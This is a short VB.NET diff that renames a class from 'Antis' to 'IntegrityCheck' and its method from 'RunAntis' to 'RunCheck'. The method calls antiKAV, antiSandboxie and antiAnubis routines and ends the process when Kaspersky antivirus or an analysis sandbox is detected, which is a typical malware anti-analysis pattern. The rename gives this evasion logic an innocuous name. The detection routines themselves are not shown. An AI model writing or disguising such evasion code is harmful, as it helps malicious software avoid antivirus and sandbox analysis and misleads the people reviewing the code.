@@ -1,11 +1,11 @@
 ﻿Imports Microsoft.Win32
 
-Public Class Antis
+Public Class IntegrityCheck
     Dim Devices As Object, Grafikadapter As String, RegionA As String = "SELECT * FROM Win32_VideoController"
     Public AppPath As String = ""
     Public AppExePath As String = ""
 
-    Public Sub RunAntis()
+    Public Sub RunCheck()
         If antiKAV() = True Then ProcKill()
         If antiSandboxie() = True Then ProcKill()
         If antiAnubis() = True Then ProcKill()
